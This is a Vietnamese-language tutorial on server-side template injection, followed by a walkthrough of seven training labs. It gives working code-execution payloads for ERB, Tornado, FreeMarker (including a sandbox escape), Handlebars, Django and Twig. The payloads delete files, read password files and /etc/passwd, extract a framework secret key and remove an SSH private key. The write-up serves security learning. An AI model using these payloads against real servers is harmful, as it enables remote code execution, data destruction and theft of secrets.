---
title: 'Web12: Server-side template injection'
tags: [web12]

---

### I\. Giới thiệu lỗ hổng Server-side template injection (SSTI)

**Server-side template injection (SSTI) là dạng lỗ hổng cho phép kẻ tấn công inject các payload (tạo bởi chính ngôn ngữ template đó) vào các template**, và chúng được thực thi tại phía server. Trong đa số trường hợp xảy ra lỗ hổng SSTI đều mang lại các hậu quả to lớn cho server, bởi các payload SSTI được thực thi trực tiếp tại server và thường dẫn tới impact cao nhất có thể là **tấn công thực thi mã nguồn tùy ý từ xa** (RCE - Remote Code Execution).

Xét ví dụ quá trình gửi thư điện tử tới người nhận theo tên. Sử dụng template **Twig** render nội dung theo dữ liệu tĩnh (static) sẽ không tạo ra lỗ hổng SSTI do giá trị **`first_name`** là giá trị tĩnh.

```none
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

Tuy nhiên, khi input từ người dùng được trực tiếp liên kết truyền vào template sẽ có thể dẫn tới tấn công SSTI.

```none
$output = $twig->render("Dear " . $_GET['name']);
```

Tình huống trên sử dụng giá trị tham số **`name`** lấy từ phương thức GET trực tiếp tạo thành một phần của template. Do người dùng có thể thay đổi giá trị **`$_GET['name']`** nên kẻ tấn công có thể inject các payload tùy ý, chẳng hạn:

```none
http://vulnerable-website.com/?name={{payload}}
```

 

SSTI là một trong những lỗ hổng ở mức nâng cao, có thể xảy ra trong nhiều loại template khác nhau.

### II\. Khai thác lỗ hổng Server-side template injection (SSTI)
Toàn bộ quá trình khai thác lỗ hổng SSTI tương đối phức tạp, bao gồm nhiều bước khác nhau. Chúng ta có thể nhìn tổng quan qua sơ đồ sau:

![image.png](https://images.viblo.asia/08baa50e-6dd5-4eb0-bf13-d6324ca75efb.png)

Cùng lần lượt tìm hiểu, phân tích ý tưởng thực hiện trong từng bước:

#### 1\. Detect - phát hiện

Detect luôn là hành động đầu tiên kẻ tấn công cần thực hiện để khai thác SSTI. Cần xác định ứng dụng có xảy ra lỗ hổng hay không, vị trí xảy ra lỗ hổng? Thông thường, với các vị trí hiển thị input người dùng ra giao diện sẽ tồn tại khả năng xảy ra lỗ hổng SSTI. Các payload được sử dụng để xác nhận lỗ hổng thường dựa trên các phép tính đơn giản (Chẳng hạn phép tính 7∗7), với cú pháp của từng template khác nhau.

Ví dụ với input **`{{7*7}}`**, khi giao diện trả về kết quả của phép tính 7∗7=49 hay bất kỳ một chuỗi "kỳ lạ" nào khác không phải **`{{7*7}}`** thì bạn có thể bước đầu xác định ứng dụng tồn tại lỗ hổng SSTI. Ví dụ cho thấy ứng dụng xảy ra lỗ hổng SSTI:

![image.png](https://images.viblo.asia/1c427ca9-2802-4478-a5a4-0e66d111aa9f.png)

Ngoài ra, chúng ta cũng có thể phát hiện lỗ hổng SSTI với payload **`${{<%[%'"}}%\.`** theo trang **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)**. Giao diện sẽ trả về kết quả error trong hầu hết mọi trường hợp template sử dụng:

![image.png](https://images.viblo.asia/d55a2a50-68a7-42c3-b970-48096b2a7179.png)

#### 2\. Identify - Nhận dạng

Sau khi phát hiện khả năng ứng dụng xảy ra lỗ hổng SSTI, chúng ta cần thực hiện bước tiếp theo - Nhận dạng template được sử dụng. Việc xác định template đang hoạt động sẽ giúp chúng ta xây dựng payload tấn công hiểu quả. Từng template sẽ render thực thi input và trả về các kết quả khác nhau, dựa vào đặc trưng này chúng ta có thể xác định chính xác template đang được sử dụng. Bạn đọc có thể tham khảo sơ đồ thống kê với các template thông dụng:

![image.png](https://images.viblo.asia/3bec5c3b-06e0-45c7-a06a-4d8fe06945a0.png)

Chúng ta có thể thử nhiều input để xác định, một số input thường dùng có thể kể đến như **`${7*7}`**, **`{{7*7}}`**, **`{{7*'7'}}`**, **`a{*comment*}b`**, ... Ví dụ, với input **`{{7*'7'}}`**, nếu kết quả trả về là **`7777777`** thì có thể xác định template đang sử dụng là **Jinja2**.

Cũng có thể sử dụng các input gây ra error cho ứng dụng nhằm thu thập thông tin template qua các thông báo lỗi. Các input dẫn đến error thường dùng: **`${}`**, **`{{}}`**, **`<%= %>`**, **`${7/0}`**, **`{{7/0}}`**, **`<%= 7/0 %>`**, ...

![image.png](https://images.viblo.asia/d8d70501-d86f-4e3f-bc5b-2db97c171e3a.png)

Ngoài ra có thể tự động hóa bằng công cụ như **[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)**.

#### 3\. Exploit - Khai thác

Sau khi đã xác định template đang hoạt động của ứng dụng, chúng ta sẽ đến với bước khai thác. Chúng ta cần đưa ra các payload nhằm tìm kiếm, xác định các thông tin quan trọng.

### III\. Các bài lab

# **1. Lab: Basic server-side template injection**
>This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
![image](https://hackmd.io/_uploads/By6KgPK8A.png)

>Truy cập vào bài lab thì không hề thấy có chức năng login hay comment gì, thay vào đó khi ấn vào xem chi tiết của sản phầm có id=1 thì hiện ra thông báo hết hàng, và dòng này được lấy từ tham số `message` ở trên URL: ![image](https://hackmd.io/_uploads/HJPigPYUR.png)

>Ta có thể nghĩ ngay tới trang web này dính lỗ hổng XSS hoặc SSTI, khi thử với payload XSS thì payload không hoạt động, do server đã encode input: ![image](https://hackmd.io/_uploads/ryYpgvtLR.png)

>Tiếp tục thử sang trường hợp SSTI, sử dụng các payload hay dùng, như
```
a{{bar}}b
a{{7*7}}
{var} ${var} {{var}} <%var%> [% var %]
```

![image](https://hackmd.io/_uploads/SkOJWPKIR.png)

>Duy nhất với payload `<%var%>` thì server trả về thông báo lỗi: 
>![image](https://hackmd.io/_uploads/B17ZWwKLR.png)

>Từ thông báo lỗi, ta có thể xác định server đang sử dụng template ERB của Ruby!!

>Tiếp tục test xem ta có thể thực thi mã hay không, sử dụng payload `<%=7*7%>`: 
>![image](https://hackmd.io/_uploads/rkbmWvF8A.png)


>Màn hình hiển thị `49`, vậy là ta chắc chắn rằng có thể thực thi các lệnh tùy ý trong server!!

>Tiếp theo, tạo payload xóa file mà đề bài yêu cầu (ta có thể dùng chatGPT để tra cứu cú pháp):
>![image](https://hackmd.io/_uploads/rJpSWvYLA.png)

>Vậy payload cuối cùng sẽ là:
>`<%= system('rm /home/carlos/morale.txt') %>`
>![image](https://hackmd.io/_uploads/S12vbDFLC.png)

>Màn hình hiển thị `true` tức là đã thành công, hoàn thành bài lab:
> ![image](https://hackmd.io/_uploads/S1SObPFLA.png)

# **2. Lab: Basic server-side template injection (code context)**
>This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/SygURSKIR.png)


>Đăng nhập vào `wiener`, tại `/my-account`, ta thấy chức năng hiển thị tên người dùng theo `Name`, `First Name`, và `Nickname`, và tùy theo lựa chọn của người dùng thì ở comment mỗi post sẽ hiển thị tên tương ứng: ![image](https://hackmd.io/_uploads/rJli0Bt80.png)

>Thử set hiển thị theo `Nickname`, ra ngoài post và comment bất kì, ta sẽ thấy hiển thị nickname của `wiener` là `H0td0g`:
>![image](https://hackmd.io/_uploads/r1-VOfK8A.png)

>Khi đổi thành `Name` thì phần tên trong comment cũng thay đổi theo: ![image](https://hackmd.io/_uploads/r1KDdGKLR.png)

>Xem lại request thay đổi tên hiển thị: ![image](https://hackmd.io/_uploads/rJgcuMKLR.png)

>Ta sẽ đi thử xem tại chỗ này có thể bị dính SSTI hay không, sử dụng các kí tự đặc biệt: 
>`${{<%[%'"}}%\`

>Kết quả là server đã bị lỗi trong quá trình render, hiển thị thông báo lỗi: ![image](https://hackmd.io/_uploads/rk_bqfKUC.png)

>Từ thông báo lỗi, ta xác định được server sử dụng template Tornado của Python!

>Test xem có thể thực thi mã hay không bằng payload ứng với template: `{{7*7}}`: ![image](https://hackmd.io/_uploads/SkNv5MYI0.png)

>Kết quả trả về `49`, vậy là ta xác nhận được rằng có thể thực thi mã từ xa tới server!
![image](https://hackmd.io/_uploads/rkZ5hGtLA.png)

> Tìm hiểu trên mạng để xóa được file `morale.txt` của Carlos trên python thì phải thực hiện được lệnh sau:
```
import os
os.system('rm /home/carlos/morale.txt')
```

>Sử dụng payload sau theo syntax của Tornado để thực hiện xóa file `morale.txt`:
`blog-post-author-display=7*7}}{% import os %}{{os.system('rm /home/carlos/morale.txt')`
>![image](https://hackmd.io/_uploads/rkydjzFIC.png)


>Tải lại trang và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJrFiGYLR.png)

# **3. Server-side template injection using documentation**
>This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`
![image](https://hackmd.io/_uploads/Sy1XkrYLA.png)

>Đăng nhập vào tài khoản cho trước, ở mỗi bài post đều có chức năng `Edit template` để có thể chỉnh sửa nội dung post: ![image](https://hackmd.io/_uploads/SysUySKUC.png)

>Đáng chú ý ở đây là dòng cuối cùng, web sẽ thực hiện việc render ra `product.stock`, `product.name` và `product.price` tương ứng, ta có thể tận dụng chỗ này để thực hiện SSTI! Thử thay payload `${var}` vào và Save: ![image](https://hackmd.io/_uploads/SJzGgBF80.png)

>Kết quả nhận được thông báo lỗi do template không render ra được: ![image](https://hackmd.io/_uploads/SJH4xrt8C.png)

>Từ error, ta có thể biết được template đang được sử dụng ở đây là **FreeMarker** của Java. Tiếp theo, test xem ta có khả năng thực thi lệnh từ xa hay không, sử dụng payload `${7*7}`: ![image](https://hackmd.io/_uploads/BJrilBt8A.png)

>Màn hình hiển thị `49`, vậy là ta xác định được rằng có thể thực thi code chỗ này!! Ta sẽ đi tìm payload tương ứng với **FreeMarker** để có thể xóa file `/home/carlos/morale.txt` theo yêu cầu của đề bài. 

>Tìm kiếm trên mạng với từ khóa **"Payload All The Thing"** `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---code-execution`, tìm kiếm cho lỗ hổng SSTI và template là **FreeMarker**, ta lấy được các payload khả thi cho việc exploit: ![image](https://hackmd.io/_uploads/r1gBxXBY8A.png)

>Có vẻ payload thứ 3 đang đúng với form payload ta cần tìm, thay giá trị `id` bằng lệnh mà ta muốn thực thi: 
>`${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`

>Save và tải lại trang và ta đã hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJoHXrF8A.png)

# **4. Server-side template injection in an unknown language with a documented exploit**
>This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
![image](https://hackmd.io/_uploads/B1QJNrFIR.png)

>Tiếp tục là 1 bài lab mà thông báo `out of stock` được render ra từ tham số `message` trên URL: ![image](https://hackmd.io/_uploads/rykxBrFLC.png)

>Ta tiếp tục thử các payload để tìm xem lab này sử dụng template gì... Khi thử đến `{{var}}` thì không thấy in ra màn hình gì cả, nghi ngờ rằng payload này đang hoạt động đúng: ![image](https://hackmd.io/_uploads/SkXDrSFIC.png)

>Thử thay xem có thể thực thi code hay không bằng payload `{{7*7}}` thì thấy có thông báo lỗi xuất hiện: ![image](https://hackmd.io/_uploads/BkghBrKUA.png)

>Qua thông báo lỗi thì biết được server sử dụng template **Handlebars**!

>Ta lại tra trên "Payload All The Thing" để lấy code exec tương ứng: 
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

>Send payload thì thấy server không thực thi nó mà vẫn trả về lỗi: ![image](https://hackmd.io/_uploads/rkvd_HFLC.png)

>Lúc này, ta sẽ đi URL-decode payload vì server sẽ thực hiện encode payload trước khi xử lí: ![image](https://hackmd.io/_uploads/SkrsdHYLR.png)
`%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d`

>Send lại và lần này payload đã được thực thi thành công!! Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/S1k1trFLC.png)

# **5. Server-side template injection with information disclosure via user-supplied objects**
>This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
To solve the lab, steal and submit the framework's secret key.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`
>![image](https://hackmd.io/_uploads/ByLUtBtUA.png)

>Đăng nhập vào tài khoản cho trước, bài này lại tiếp tục ta có thể chỉnh sửa nội dung bài post: ![image](https://hackmd.io/_uploads/SJqB9rF80.png)

>Thử thay payload `{{7*7}}` thì server trả về thông báo lỗi: ![image](https://hackmd.io/_uploads/SyJF9rt80.png)

>Từ thông báo lỗi, ta biết được server sử dụng template **Django** của Python. Tra trên Payload All The Thing, ta tìm được 1 payload để lấy key: 
>![image](https://hackmd.io/_uploads/HJKF3BYUC.png)

>Nhưng khi sử dụng lại không thấy có gì: ![image](https://hackmd.io/_uploads/SJX33HKUR.png)

>Tiếp tục tới xem thông tin debug: 
>![image](https://hackmd.io/_uploads/HJ8a2SFIC.png)

>Lần này, ta lại có thêm thông tin: 
>![image](https://hackmd.io/_uploads/BkBypBtUC.png)

>Thông thường trong ứng dụng Django, secret key sẽ được lưu tại biến `SECRET_KEY` trong object settings. Sử dụng payload `{{ settings.SECRET_KEY }}` và ta lấy được secret key cần tìm:
> ![image](https://hackmd.io/_uploads/ryeUTHFI0.png)

>Submit flag và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Hy6DpHKUR.png)

# **6. Lab: Server-side template injection in a sandboxed environment**
>This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file `my_password.txt` from Carlos's home directory. Then submit the contents of the file.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`
>![image](https://hackmd.io/_uploads/S1DhJ8tLC.png)

>Đăng nhập vào tài khoản cho trước, bài này lại tiếp tục ta có thể chỉnh sửa nội dung bài post: ![image](https://hackmd.io/_uploads/rJSJe8YIA.png)

>Thử thay payload `${abc}` để tìm xem server đang sử dụng template gì:
>![image](https://hackmd.io/_uploads/B1xGe8KLC.png)

>Từ thông báo lỗi, biết rằng server dùng **FreeMarker** của Java!

>Sử dụng code thực thi để đọc nội dung file cần tìm: 
>`${"freemarker.template.utility.Execute"?new()("cat /home/carlos/my_password.txt")}`
>![image](https://hackmd.io/_uploads/Bk0ae8FLR.png)

>Thông báo chỉ ra `freemarker.template.utility.Execute is not allowed in the template for security reasons` => Ứng dụng chỉ cho phép edit trong môi trường sandbox, có thể là **Sandbox is based on method blocklist**.

>Ta lại có được payload để bypass sandbox: 
>![image](https://hackmd.io/_uploads/BkE2bIY80.png)
```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}
```

>Send payload và đọc được nội dung cần tìm: 
>![image](https://hackmd.io/_uploads/H1xeM8KLR.png)

>Submit flag và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/ry_bGIKUC.png)

# **7. Server-side template injection with a custom exploit**
>This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/BJwZELK8C.png)

>Đăng nhập vào `wiener`, ta thấy có 2 chức năng `Upload avatar` và `Preferred name`
>![image](https://hackmd.io/_uploads/S1RwNUK8A.png)

>Tương tự bài lab 2, chức năng thay đổi cách hiển thị tên trong các bài post bị dính SSTI. Thử với payload `${{<%[%'"}}%\`: 
>![image](https://hackmd.io/_uploads/SJAkH8K8A.png)

>Comment bất kì vào 1 bài post và tải lại trang, thấy rằng server thông báo lỗi: ![image](https://hackmd.io/_uploads/SkF7rLYUA.png)

>Từ lỗi, ta biết được rằng server đang sử dụng template **Twig** của PHP.
Như vậy server có thể render author name bằng `{{blog-post-author-display}}`.

>Xác định có thể thực thi code từ xa bằng payload: 
>`blog-post-author-display=user.nickname}}{{7*7`
>![image](https://hackmd.io/_uploads/ByKTrLK8R.png)

>Màn hình hiển thị **49** . Như vậy ta có thể thực hiện SSTI tại chức năng này!

>Mặt khác, ở chức năng upload avatar, khi upload sai định dạng yêu cầu, một error được trả về từ User class tại `/home/carlos/User.php`. Và server sẽ gọi `User->setAvatar('/tmp/filename', 'MIME_TYPE')` để set avatar cho user: 
>![image](https://hackmd.io/_uploads/S1EiwIKLA.png)

>Ta sẽ tận dụng lỗi SSTI ở trên để gọi hàm `User.setAvatar()` với file bất kì rồi xem avatar để lấy được nội dung file đó. Thử payload sau để set avatar là nội dung file `/etc/passwd`:
>`blog-post-author-display=user.setAvatar('/etc/passwd')`

>Vẫn bị lỗi,  ta cần thêm 1 tham số **MIME_TYPE**: 
>![image](https://hackmd.io/_uploads/Hy0vOUFL0.png)

>Và vì avatar yêu cầu file ảnh, nên ta truyền thêm `image/jpeg`.
`blog-post-author-display=user.setAvatar('/etc/passwd','image/jpeg')`

>Truy cập 1 bài post xem avatar, ta thấy nội dung file `/etc/passwd` đã được trả về:
>![image](https://hackmd.io/_uploads/HkWqpLYLA.png)
>Tương tự để xem nội dung class **User**:
`blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')`
![image](https://hackmd.io/_uploads/BySyRIFUC.png)

>Source code: 
```
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

>Đọc source code, ta thấy hàm `setAvatar(filename, mimetype)` sẽ tạo 1 symlink từ `avatarLink` đến `filename`. Mặt khác hàm `gdprDelete()` lại có chức năng xóa cả `avatarLink` và target nó đang link đến (chính là `filename`).

>Như vậy ta sẽ set avatar là file cần xóa '**/home/carlos/.ssh/id_rsa**'.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')`
>![image](https://hackmd.io/_uploads/SyDi0LF8R.png)

>Sau đó, ta sẽ gọi hàm `user.gdprDelete()` để xóa avatar vừa set (chính là file `/home/carlos/.ssh/id_rsa` . Payload: 
`blog-post-author-display=user.gdprDelete()`

>Tải lại trang và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/BkQXkvt8R.png)
